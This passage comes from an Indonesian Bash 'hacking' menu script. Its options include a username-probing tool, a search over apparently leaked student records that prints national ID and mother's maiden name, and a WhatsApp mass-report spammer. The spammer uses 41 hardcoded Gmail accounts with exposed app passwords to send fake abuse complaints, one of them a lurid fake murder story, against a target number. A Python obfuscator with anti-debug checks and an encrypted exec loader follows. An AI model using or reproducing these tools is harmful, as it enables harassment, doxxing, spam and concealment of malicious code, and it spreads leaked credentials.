    ["BuyMeACoffee"]="https://www.buymeacoffee.com/%s"
    ["TripAdvisor"]="https://www.tripadvisor.com/Profile/%s"
    ["Fiverr"]="https://www.fiverr.com/%s"
    ["Freelancer"]="https://www.freelancer.com/u/%s"
    ["Wattpad"]="https://www.wattpad.com/user/%s"
    ["Patreon"]="https://www.patreon.com/%s"
    ["Sketchfab"]="https://sketchfab.com/%s"
    ["DeviantArt"]="https://www.deviantart.com/%s"
    ["Gravatar"]="https://en.gravatar.com/%s"
    ["ProductHunt"]="https://www.producthunt.com/@%s"
    ["Flipboard"]="https://flipboard.com/@%s"
    ["About.me"]="https://about.me/%s"
    ["Disqus"]="https://disqus.com/by/%s/"
    ["Vimeo"]="https://vimeo.com/%s"
    ["Trello"]="https://trello.com/%s"
    ["Google"]="https://myaccount.google.com/?authuser=%s"
    ["Gmail"]="https://mail.google.com/mail/u/%s"
    ["Drive"]="https://drive.google.com/drive/u/%s/my-drive"
    ["Photos"]="https://photos.google.com/u/%s"
    ["ChromeSync"]="https://chrome.google.com/sync?account=%s"
    ["YouTube"]="https://www.youtube.com/channel/%s"
    ["Calendar"]="https://calendar.google.com/calendar/u/%s/r"
    ["MyAnimeList"]="https://myanimelist.net/profile/%s"
    ["Bandcamp"]="https://%s.bandcamp.com"
    ["Roblox"]="https://www.roblox.com/user.aspx?username=%s"
    ["Snapchat"]="https://www.snapchat.com/add/%s"
    ["Quora"]="https://www.quora.com/profile/%s"
    ["Linktree"]="https://linktr.ee/%s"
    ["Giphy"]="https://giphy.com/%s/"
    ["Bitbucket"]="https://bitbucket.org/%s/"
    ["OpenSea"]="https://opensea.io/%s"
    ["ArtStation"]="https://www.artstation.com/%s"
    ["ReverbNation"]="https://www.reverbnation.com/%s"
)
banner() {
echo ""
echo "
██████╗  ██████╗ ██████╗ ██╗  ██╗
██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝
██║  ██║██║   ██║██████╔╝█████╔╝ 
██║  ██║██║   ██║██╔══██╗██╔═██╗ 
██████╔╝╚██████╔╝██║  ██║██║  ██╗
╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
" | lolcat
echo -e "${p}  Development ${g}: ${c}Thxyzz404"
echo ""
}
check_username() {
    local username=$1
    echo -e "${r}[ ${g}INFO ${r}]${y} Mengecek username : $username"
    echo ""
    for site in "${!SITES[@]}"; do
        url=$(printf "${SITES[$site]}" "$username")
        status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
        if [[ "$status" == "200" ]]; then
            echo -e "${r}[ ${g}✓ ${r}]${c} $site : Ditemukan → $url"
        elif [[ "$status" == "404" ]]; then
            echo -e "${r}[ ${g}x ${r}]${y} $site : Tidak Ada"
        else
            echo -e "${r}[ ${g}? ${r}]${p} $site : Tidak Pasti (Status: $status)"
        fi
    done
}
run() {
    banner
    echo -e "${g}"
    read -p "🔍 Masukkan username yang ingin dicari : " username
    echo ""
    check_username "$username"
    echo ""
    echo -e "${r}↩️ Tekan Enter untuk keluar...!!"
    read
}
run
            echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
            read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
            clear
               ;;
       39)
               echo ""
               mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
               echo -e "${c} Anda Memilih Menu Hacking..!!"
               echo ""
               echo -e "${r} VIP UNLOCK..!!"
               sleep 2
r='\033[31;1m'
g='\033[32;1m'
b='\033[34;1m'
c='\033[36;1m'
y='\033[33;1m'
p='\033[35;1m'
n='\033[0m'
show_loading() {
    local text="$1"
    echo -ne "${c}$text "
    for i in {1..10}; do
        echo -ne "▰"
        sleep 0.1
    done
    echo -e "${n}"
}
clear
echo "
⠀⠀⠀⢀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣄⡀⠀⠀⠀⠀
 ⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⠀⠀
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠙⠯⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⡆
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
 ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
 ⠀⠀⠈⠒⠹⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠁ " | lolcat 
echo ""
echo -e "${y} Contoh input : /sdcard/Folder/File.json "
echo -e "${g}"
read -p "📁 Masukkan path file db.json : " file_path
echo ""
show_loading "Memeriksa file :"
if [ ! -f "$file_path" ]; then
    clear 
    echo ""
    echo -e "${r} File tidak ditemukan : '$file_path' "
    echo ""
fi
if ! jq empty "$file_path" 2>/dev/null; then
    clear 
    echo ""
    echo -e "${y} File no valid bkn file json."
    echo ""
fi
echo ""
echo -e "${r}[ ${g}✓ ${r}]${b} File valid siap di gunakan."
total_data=$(jq '. | length' "$file_path" 2>/dev/null || echo "0")
echo -e "${r}[ ${g}+ ${r}]${y} Total data dalam file : $total_data"
sleep 4
echo ""
clear
syg="ansi-rounded"
cowsay -f eyes 'Check-Username' | boxes -d "$syg" | lolcat
echo ""
echo -e "${p}            Development ${r}:${c} Thxyzz404"
echo ""
echo -e "${c}"
read -p "👤 Masukkan username : " user
if [ -z "$user" ]; then
    clear 
    echo ""
    echo -e "${r} Username tidak boleh kosong."
    echo ""
fi
echo ""
show_loading "Melakukan pencarian :"
echo ""
filename=$(basename "$file_path")
display_result() {
    local result="$1"
    echo -e "${g}👤 DATA SISWA"
    echo -e "${n}============================"
    echo ""
    echo "$result" | jq '
        {
            "nama": .nama,
            "jenis_kelamin": .jenis_kelamin,
            "tanggal_lahir": .tanggal_lahir,
            "nama_ibu_kandung": .nama_ibu_kandung,
            "nik": .nik,
            "nisn": .nisn,
            "last_update": .last_update,
            "rombel": .rombel,
            "tingkat": .tingkat,
            "peserta_didik_id": .peserta_didik_id,
            "rombongan_belajar_id": .rombongan_belajar_id
        }'
}
result=$(jq --arg nama "$user" '
    .[] | select(
        .nama and 
        (.nama | ascii_downcase | contains($nama | ascii_downcase))
    )
' "$file_path" 2>/dev/null)
if [ -z "$result" ] || [ "$(echo "$result" | tr -d '[:space:]')" = "" ]; then
    echo -e "${r} Data dengan nama '$user' tidak ditemukan!"
else
    display_result "$result"
    count=$(echo "$result" | jq -s '. | length' 2>/dev/null || echo "1")
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Ditemukan : $count data siswa."
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
       40) 
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
bar() {
    f=(
        "[\e[1;91m■\e[0m□□□□□□□□□]"
        "[\e[1;92m■■\e[0m□□□□□□□□]"
        "[\e[1;93m■■■\e[0m□□□□□□□]"
        "[\e[1;94m■■■■\e[0m□□□□□□]"
        "[\e[1;95m■■■■■\e[0m□□□□□]"
        "[\e[1;96m■■■■■■\e[0m□□□□]"
        "[\e[1;97m■■■■■■■\e[0m□□□]"
        "[\e[1;92m■■■■■■■■\e[0m□□]"
        "[\e[1;93m■■■■■■■■■\e[0m□]"
        "[\e[1;94m■■■■■■■■■■\e[0m]"
    )
    while true; do
        for fra in "${f[@]}"; do
            printf "\r$fra \033[41;1m\033[1;32mReport_Aktif!!\033[0m "
            sleep 0.12
        done
    done
}
spam_report_wea() {
clear
mek="ansi-rounded"
echo "
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣶⣶⣶⣶⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀
⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⡿⠟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⣾⣿⣿⣿⣿⡟⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣿⣿⣿⣿⣦⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠘⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠈⠻⢿⣿⠟⠉⠛⠿⣿⣿⣿⣿⣿⣿⠃
⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⡿⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣴⣾⣿⣿⣿⣿⡿⠁⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀
⠠⠛⠛⠛⠉⠁⠀⠈⠙⠛⠛⠿⠿⠿⠿⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀
" | boxes -d "$mek" | lolcat
echo ""
echo -e "\033[100;32m======================================\033[0m"
echo -e "${p}        Developer ${r}: ${c}Thxyzz404"
echo -e "\033[100;32m======================================\033[0m"
echo ""
read -p "$(echo -e "${y}Masukkan no target ${r}[ ${g}contoh : 62xxx ${r}]${c} : ")" get
if [ -z "$get" ]; then
  clear 
  echo ""
  echo -e "${r} Nomer jangan kosong."
  echo ""
  return
fi
no=$(echo "$get" | tr -d ' ')
if [[ ! "$no" =~ ^\+?[0-9]{8,15}$ ]]; then
    clear 
    echo ""
    echo -e "${r} Formatnya yg bener dongs."
    echo ""
    return
fi
[[ ! "$no" =~ ^\+ ]] && no="+$no"    
echo ""
bar &
LOAD_PID=$!    
python3 -c "
import sys
import time
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import phonenumbers

nomor_input = '$get'

EMAIL_TARGETS = [
    'abuse@whatsapp.com',
    'support@whatsapp.com',
    'smb@support.whatsapp.com',
    'business@support.whatsapp.com',
    'Suporte@support.whatsapp.com',
]

def get_email_senders():
    return [
        {'email': 'termuxmikasa@gmail.com', 'app_password': 'jrpi ejvt rfte kuxd'},
        {'email': 'tt0861230@gmail.com', 'app_password': 'gtdy mllp rvft fdzt'},
        {'email': 'spamreportuntukproyek@gmail.com', 'app_password': 'rcjb wtpf cpmb zqmc'},
        {'email': 'ya2771326@gmail.com', 'app_password': 'bpex yhmi ymmm mzrt'},
        {'email': 'anonimousee909@gmail.com', 'app_password': 'vwsz udcr zwtn nddt'},
        {'email': 'anonimouse90909@gmail.com', 'app_password': 'hhgl fmji jsae sqxu'},
        {'email': 'anonimouse9099@gmail.com', 'app_password': 'qpss riuo pkjk tmeg'},
        {'email': 'anonimouse90999@gmail.com', 'app_password': 'ijrf hhuo jpml iysc'},
        {'email': 'aaabaaah2@gmail.com', 'app_password': 'oqtx elxg cefv dgvd'},
        {'email': 'anjaynathan399@gmail.com', 'app_password': 'cpil kwkt llab sodh'},
        {'email': 'joeellan26@gmail.com', 'app_password': 'wnfe iboi ktrr uder'},
        {'email': 'bayarutangllu@gmail.com', 'app_password': 'cbty vvaf rncu oawg'},
        {'email': 'cindyfiolita9@gmail.com', 'app_password': 'kpvu treo hfar zqdy'},
        {'email': 'anonymousgalirus@gmail.com', 'app_password': 'ltnc fedd qzsy lfwu'},
        {'email': 'gstorekonter4@gmail.com', 'app_password': 'xwdq ugie fbjw xeaa'},
        {'email': 'makluetekerbpaluhekel@gmail.com', 'app_password': 'oyys dexg uofj vhkt'},
        {'email': 'fire.send482@gmail.com', 'app_password': 'dpus bvni hmvn caob'},
        {'email': 'jiki.mioli08@gmail.com', 'app_password': 'gzwj sohl dzxd pteh'},
        {'email': 'tayotayooxirf@gmail.com', 'app_password': 'edpj gvcx fehp rtfl'},
        {'email': 'tayo404tayyo404@gmail.com', 'app_password': 'jeat hezh ditz akuk'},
        {'email': 'irfafitrio@gmail.com', 'app_password': 'khtm tnxz nbey ahue'},
        {'email': 'sigmamewing1232@gmail.com', 'app_password': 'trzs dett smbl iykw'},
        {'email': 'joyditiano9@gmail.com', 'app_password': 'rnfv nfqa ggcf lyqn'},
        {'email': 'draid6247@gmail.com', 'app_password': 'dhwm abuc vkan sofg'},
        {'email': 'daemontechx@gmail.com', 'app_password': 'jxov iorq ztpw hirz'},
        {'email': 'daemoniumuserv2@gmail.com', 'app_password': 'yexa nkvy ghqh hsbd'},
        {'email': 'daemoniumuser@gmail.com', 'app_password': 'wgas iris atyy xpnc'},
        {'email': 'c26898771@gmail.com', 'app_password': 'ykky jurp svqq kmhj'},
        {'email': 'rizkicuaca62@gmail.com', 'app_password': 'azud gild ptqm ooip'},
        {'email': 'bunawarhadi@gmail.com', 'app_password': 'qhub vsfb oytb qqoa'},
        {'email': 'gutodoang@gmail.com', 'app_password': 'rcer clrw tckg ppea'},
        {'email': 'bocahbebanbocahbeban@gmail.com', 'app_password': 'fdye aial ngai clqp'},
        {'email': 'siniluanjing484@gmail.com', 'app_password': 'chji sayr htkq wjjz'},
        {'email': 'qoegvnv@gmail.com', 'app_password': 'ueha fbsz unmb jqzj'},
        {'email': 'takame829@gmail.com', 'app_password': 'firo ngvs xali pfjy'},
        {'email': 'haihakjsbsajsjnebsh5@gmail.com', 'app_password': 'qvar taip eifk mxki'},
        {'email': 'ythead.gtrva001@gmail.com', 'app_password': 'fdrr hjpa srza rops'},
        {'email': 'v8728799@gmail.com', 'app_password': 'wjng geyu qrjb qrkz'},
        {'email': 'zarkymark7@gmail.com', 'app_password': 'jlem mvwf nsog bvpq'},
        {'email': 'periport01@gmail.com', 'app_password': 'chpo ubdi snry fafw'},
        {'email': 'reyhad52@gmail.com', 'app_password': 'cnyo txjs jzbi hkea'},
    ]

def buat_subject(nomor):
    subjects = [
        f'Report Abuse - {nomor}',
        f'Complaint - {nomor}',
        f'Fraud Alert - {nomor}',
        f'Spam Report - {nomor}',
        f'Legal Complaint - {nomor}'
    ]
    return random.choice(subjects)

def buat_body(nomor):
    templates = [
        f'''Para usuários de privacidade legal do WhatsApp.

Há notícias emocionantes, nomeadamente a descoberta da CABEÇA HUMANA.

Uma descoberta horrível foi relatada na área de Pasaje quando, por volta das 15h40, no FORTE LOS NARANJOS, os guardas do setor descobriram uma mochila suspeita.

Depois de examinar o conteúdo, uma cabeça humana foi encontrada no interior.

Policiais do circuito Velasco Ibarra foram imediatamente alertados e se deslocaram ao local para verificar a denúncia.

As autoridades confirmaram a presença da peça anatômica e iniciaram o isolamento da área para a realização dos procedimentos necessários.

Os investigadores estão atualmente a recolher informações sobre a origem da mala e as circunstâncias em que a mochila foi deixada.

A polícia solicitou a intervenção de unidades especiais para iniciar as investigações relacionadas.

Se você quiser ver as fotos do incidente, pode clicar no link 🔗👇

https://ibb.co.com/kJm3bzD

Abaixo está uma foto da vítima de homicídio 🔪🔪

Para mais informações sobre essa novidade maluca entre em contato pelo nosso WhatsApp 💬👇

https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}

Apoiado por:
abuse@whatsapp.com
support@whatsapp.com
business@support.whatsapp.com
smb@support.whatsapp.com''',
        f'''Urgent Report: Violation of WhatsApp Terms - {nomor}

We have detected multiple suspicious activities associated with this number.

Please investigate immediately.

Reference: Case #{random.randint(100000,999999)}'''
    ]
    return random.choice(templates)

def kirim_email(sender_info, nomor):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_info['email']
        msg['Subject'] = buat_subject(nomor)
        msg.attach(MIMEText(buat_body(nomor), 'plain'))

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender_info['email'], sender_info['app_password'])
        except:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.login(sender_info['email'], sender_info['app_password'])

        server.sendmail(sender_info['email'], EMAIL_TARGETS, msg.as_string())
        server.quit()
        time.sleep(random.uniform(2, 5))
        return True
    except:
        return False

def validasi_nomor(nomor_input):
    try:
        if not nomor_input.startswith('+'):
            nomor_input = '+' + nomor_input
        parsed = phonenumbers.parse(nomor_input, None)
        if phonenumbers.is_valid_number(parsed):
            return phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
    except:
        pass
    return None

nomor = validasi_nomor(nomor_input)
if not nomor:
    sys.exit(1)

senders = get_email_senders()
berhasil = 0
gagal = 0

for sender in senders:
    if kirim_email(sender, nomor):
        berhasil += 1
    else:
        gagal += 1
    time.sleep(random.uniform(1, 3))

print(f'\033[32;1mBerhasil Terkirim : {berhasil}')
print(f'\033[31;1mGagal Terkirim : {gagal}')
"
kill $LOAD_PID 2>/dev/null
wait $LOAD_PID 2>/dev/null
echo -e "\r\033[K"
echo ""
}
spam_report_wea
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      52)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              echo -e "${n}"
              clear
SAVE_DIR="/sdcard/ENCRIPSI_PYTHON"
echo "
 ██████╗██╗   ██╗████████╗██╗  ██╗
██╔════╝╚██╗ ██╔╝╚══██╔══╝██║  ██║
██║      ╚████╔╝    ██║   ███████║
██║       ╚██╔╝     ██║   ██╔══██║
╚██████╗   ██║      ██║   ██║  ██║
 ╚═════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ 
      Developer : Thxyzz404 " | lolcat
echo ""
echo "Contoh input pengguna : /sdcard/Folder/File_Tujuan.py"
echo ""            
read -p "Masukkan path file : " file
echo ""

if [ ! -f "$file" ]; then
    clear 
    echo ""
    echo "❌ File tidak ditemukan!"
    echo ""
fi
read -p "Masukkan output file [ contoh : Obf ] : " output
echo ""
mkdir -p "$SAVE_DIR"
if [ -z "$output" ]; then
    output="Obf"
fi
output_pyc="$SAVE_DIR/${output}.py"
echo "🔐 Proses Enkripsi + Kompilasi dimulai."
echo ""
python3 -c "
import zlib
import hashlib
import random
import marshal
import sys
import os
import base64
import time
import struct
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.fernet import Fernet
import secrets
import py_compile
def _anti_debug():
    try:
        if sys.gettrace() is not None:
            print(\"❌ DEBUGGING TERDETEKSI — FILE DIHENTIKAN\")
            sys.exit(9)
        bad_env = [\"PYCHARM\", \"VSCODE\", \"DEBUG\", \"TRACE\"]
        for k, v in os.environ.items():
            for b in bad_env:
                if b in k.upper() or b in str(v).upper():
                    print(\"❌ DEBUGGING ENV TERDETEKSI\")
                    sys.exit(9)
    except:
        pass
class XyntrixStrongEncryptor:
    def __init__(self, key_seed):
        self.key_seed = key_seed.encode('utf-8')
        self.master_key = hashlib.pbkdf2_hmac(
            'sha256', 
            self.key_seed, 
            b'xyntrix_salt', 
            100000,
            32
        )      
        fernet_key = hashlib.sha256(self.key_seed * 3).digest()
        self.fernet = Fernet(base64.urlsafe_b64encode(fernet_key))
    def encrypt_chacha20(self, data):
        chacha = ChaCha20Poly1305(self.master_key)
        nonce = os.urandom(12)       
        ciphertext = chacha.encrypt(nonce, data, None)      
        return nonce + ciphertext    
    def encrypt_fernet(self, data):
        return self.fernet.encrypt(data)    
    def encrypt_hybrid(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')       
        compressed = zlib.compress(data, 9)       
        chacha_encrypted = self.encrypt_chacha20(compressed)       
        fernet_encrypted = self.encrypt_fernet(chacha_encrypted)       
        return base64.b85encode(fernet_encrypted).decode('ascii')
def hex_to_special_chars(hex_text):
    hex_to_special = {
        '0': 'E͐', '1': '͙', '2': '͏', '3': '͂', '4': '͆', '5': '͕', 
        '6': '͓', '7': '̓', '8': '́', '9': '͔', 'a': 'ͅ', 'b': '̝', 
        'c': '̈', 'd': '͌', 'e': '͍', 'f': '̈́'
    }
    result = \"\"
    for char in hex_text.lower():
        result += hex_to_special.get(char, char)
    return result
def generate_useful_spam():
    spam_lines = []
    for i in range(500):
        spam_lines.append(f\"_var_{i:04d} = {random.randint(1000, 9999)}\")
    for i in range(400):
        spam_lines.append(f\"def _func_{i:04d}(x):\")
        spam_lines.append(f\"    return x * {random.randint(2, 10)} + {random.randint(1, 100)}\")
    for i in range(400):
        spam_lines.append(f\"_calc_{i:04d} = ({random.randint(100, 999)} + {random.randint(10, 99)}) * {random.randint(2, 10)}\")
    for i in range(400):
        spam_lines.append(f\"_str_{i:04d} = '{\"\".join(chr(random.randint(65, 90)) for _ in range(10))}'.lower()\")
    for i in range(300):
        spam_lines.append(f\"_list_{i:03d} = [{', '.join(str(random.randint(1, 100)) for _ in range(5))}]\")
    for i in range(300):
        spam_lines.append(f\"_dict_{i:03d} = {{'key1': {random.randint(1, 100)}, 'key2': {random.randint(1, 100)}, 'key3': {random.randint(1, 100)}}}\")
    for i in range(300):
        spam_lines.append(f\"_lambda_{i:03d} = lambda x: x + {random.randint(10, 100)}\")
    for i in range(200):
        spam_lines.append(f\"class _Cls{i:03d}:\")
        spam_lines.append(f\"    value = {random.randint(1, 1000)}\")
        spam_lines.append(f\"    def get_value(self):\")
        spam_lines.append(f\"        return self.value\")    
    spam_lines.append(\"import sys as _sys_x\")
    spam_lines.append(\"import os as _os_x\")
    spam_lines.append(\"import time as _time_x\")
    spam_lines.append(\"import random as _rand_x\")
    spam_lines.append(\"import math as _math_x\")
    spam_lines.append(\"import re as _re_x\")  
    return \"\\n\".join(spam_lines)
def hide_encrypted_data(data_string):
    chunk_size = random.randint(30, 80)
    chunks = [data_string[i:i+chunk_size] for i in range(0, len(data_string), chunk_size)]
    hidden_code = \"\"
    var_names = []    
    for i, chunk in enumerate(chunks):
        var_name = f\"__x{i:04d}__\"
        var_names.append(var_name)
        hidden_code += f'{var_name}=\"{chunk}\"\\n'   
    hidden_code += f'__data__=\"\".join([{\",\".join(var_names)}])\\n'
    return hidden_code
def hide_imports():
    imports_code = [
        \"import sys as _sys_private\",
        \"import os as _os_private\", 
        \"import time as _time_private\",
        \"import zlib as _zlib_private\",
        \"import hashlib as _hashlib_private\",
        \"import base64 as _base64_private\",
        \"import marshal as _marshal_private\",
        \"from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305 as _ChaCha20Poly1305_private\",
        \"from cryptography.fernet import Fernet as _Fernet_private\"
    ]
    return \"\\n\".join(imports_code) + \"\\n\"
input_file = \"$file\"
output_base = \"$SAVE_DIR/$output\"
key_seed = secrets.token_hex(16)
print(f\"📂 Input : {input_file}\")
print(f\"📂 Output : {output_base}.py\")
print(f\"🔑 Key : {key_seed[:8]}.{key_seed[-8:]}\")
print(\"\")
try:
    print(\"📖 Membaca file.\")
    with open(input_file, 'r', encoding='utf-8') as f:
        original_code = f.read()         
    print(\"🔐 Enkripsi dengan ChaCha20-Poly1305.\")
    encryptor = XyntrixStrongEncryptor(key_seed)
    encrypted_data = encryptor.encrypt_hybrid(original_code.encode('utf-8'))
    encrypted_hex = base64.b85decode(encrypted_data).hex()
    special_encrypted_data = hex_to_special_chars(encrypted_hex)
    hidden_data_code = hide_encrypted_data(special_encrypted_data)   
    LOADER = f'''{hide_imports()}
{generate_useful_spam()}
def _security_check():
    try:
        if _sys_private.gettrace() is not None:
            _sys_private.exit(99)
        debug_env_vars = ['PYCHARM_HOSTED', 'VSCODE_PID', 'DEBUGPY', 'PYDEV_IP', 'PYDEVD_LOAD_VALUES_ASYNC']
        for var in debug_env_vars:
            if var in _os_private.environ:
                _sys_private.exit(99)              
        return True        
    except Exception as e:
        _sys_private.exit(99)
_security_check()
{hidden_data_code}
_key_seed_ = \"{key_seed}\"
_key_bytes_ = _key_seed_.encode(\"utf-8\")
_chacha_key_ = _hashlib_private.pbkdf2_hmac(
    \"sha256\", _key_bytes_, b\"xyntrix_salt\", 100000, 32
)
_fernet_key_ = _hashlib_private.sha256(_key_bytes_ * 3).digest()
_fernet_ = _Fernet_private(_base64_private.urlsafe_b64encode(_fernet_key_))
_special_to_hex_dict_ = {{
    \"E͐\": \"0\", \"͙\": \"1\", \"͏\": \"2\", \"͂\": \"3\", \"͆\": \"4\", 
    \"͕\": \"5\", \"͓\": \"6\", \"̓\": \"7\", \"́\": \"8\", \"͔\": \"9\", 
    \"ͅ\": \"a\", \"̝\": \"b\", \"̈\": \"c\", \"͌\": \"d\", \"͍\": \"e\", \"̈́\": \"f\"
}}
_hex_chars_ = []
_i_ = 0
while _i_ < len(__data__):
    _found_ = False
    for _special_char_, _hex_char_ in _special_to_hex_dict_.items():
        if __data__.startswith(_special_char_, _i_):
            _hex_chars_.append(_hex_char_)
            _i_ += len(_special_char_)
            _found_ = True
            break
    if not _found_:
        _i_ += 1
_enc_hex_ = \"\".join(_hex_chars_)
_enc_bytes_ = bytes.fromhex(_enc_hex_)
_enc_b85_ = _base64_private.b85encode(_enc_bytes_).decode(\"ascii\")
_enc_final_ = _base64_private.b85decode(_enc_b85_)
try:
    _fernet_decrypted_ = _fernet_.decrypt(_enc_final_)
    _nonce_ = _fernet_decrypted_[:12]
    _chacha_data_ = _fernet_decrypted_[12:]  
    _chacha_ = _ChaCha20Poly1305_private(_chacha_key_)
    _chacha_decrypted_ = _chacha_.decrypt(_nonce_, _chacha_data_, None)
    _decompressed_ = _zlib_private.decompress(_chacha_decrypted_)
    _code_obj_ = compile(_decompressed_.decode(\"utf-8\"), \"<PROTECTED>\", \"exec\")
    _bytecode1_ = _marshal_private.dumps(_code_obj_)
    _bytecode2_ = _marshal_private.dumps(_bytecode1_)
    _bytecode3_ = _marshal_private.dumps(_bytecode2_)
    _exec_code1_ = _marshal_private.loads(_bytecode3_)
    _exec_code2_ = _marshal_private.loads(_exec_code1_)
    _exec_code3_ = _marshal_private.loads(_exec_code2_)   
    exec(_exec_code3_)   
except Exception as e:
    print(\"❌ DECRYPTION FAILED - File corrupted or modified\")
    _sys_private.exit(1)
{generate_useful_spam()}
'''   
    final_output = \"\"
    for _ in range(3):
        final_output += generate_useful_spam() + \"\\n\\n\"
    final_output += LOADER + \"\\n\"
    for _ in range(3):
        final_output += generate_useful_spam() + \"\\n\\n\"   
    temp_py_file = f\"{output_base}_temp.py\"
    with open(temp_py_file, 'w', encoding='utf-8') as f:
        f.write(final_output)   
    pyc_file = f\"{output_base}.py\"
    print(f\"🔄 Mengkompilasi ke bytecode Python.\")
    py_compile.compile(
        file=temp_py_file,
        cfile=pyc_file,
        dfile=pyc_file,
        optimize=2
    )    
    if os.path.exists(temp_py_file):
        os.remove(temp_py_file)
    if os.path.exists(pyc_file):
        pyc_size = os.path.getsize(pyc_file)
        print(f\"✅ SUKSES! File : {pyc_file}\")
        print(f\"📁 Ukuran : {pyc_size:,} bytes\")
        print(f\"🔐 Metode : ChaCha20-Poly1305 + Fernet + Zlib\")
    else:
        print(\"❌ Gagal membuat file.\")        
except Exception as e:
    print(f\"❌ ERROR: {str(e)}\")
"
if [ $? -eq 0 ]; then
    echo ""
    echo "🎉 Proses selesai!"
    echo "📦 File tersimpan di : $output_pyc"
    echo ""
else
    echo ""
    echo "❌ Proses gagal!"
    echo ""
fi
echo ""
